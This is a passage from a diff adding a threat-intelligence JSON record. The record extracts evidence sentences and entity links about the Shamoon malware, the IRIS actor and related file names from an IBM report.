+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r6"
+      },
+      "text": "Based on observations associated with the malicious document, we observed subsequent shell sessions probably associated with Metasploit’s Meterpreter that enabled deployment of additional tools and malware preceding deployment of three Shamoon-related files: ntertmgr32.exe, ntertmgr64.exe and vdsk911.sys.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_38",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_Intelligence_Services",
+        "ent_threatactor_IRIS"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_title",
+      "page": 0,
+      "candidate_entity_ids": [
+        "ent_malware_Shamoon",
+        "ent_campaign_The_Full_Shamoon"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_26",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_Shamoon",
+        "ent_file_ntertmgr32.exe",
+        "ent_file_ntertmgr64.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_41",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_Shamoon",
+        "ent_file_ntertmgr32.exe",
+        "ent_file_ntertmgr64.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_35",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_Intelligence_Services",
+        "ent_threatactor_IRIS"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_1",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_threatactor_Intelligence_Services",
+        "ent_malware_Shamoon",
+        "ent_threatactor_IRIS"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_21",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_Intelligence_Services",
+        "ent_threatactor_IRIS"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
